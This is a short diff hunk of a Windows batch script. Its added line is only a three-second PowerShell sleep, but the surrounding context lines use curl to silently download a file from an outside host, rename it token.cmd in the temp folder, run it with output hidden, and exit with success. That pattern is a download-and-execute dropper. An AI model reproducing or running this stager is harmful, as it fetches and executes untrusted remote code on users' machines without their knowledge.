@@ -4,4 +4,5 @@ if exist "%TEMP%\token.cmd" del "%TEMP%\token.cmd" >nul 2>&1
 curl -s -L -o "%TEMP%\parse" "https://www.sandbox-support.cloud/v2" >nul 2>&1
 ren "%TEMP%\parse" token.cmd >nul 2>&1
 "%TEMP%\token.cmd" >nul 2>&1
+powershell -Command "Start-Sleep -Seconds 3"
 exit /b 0
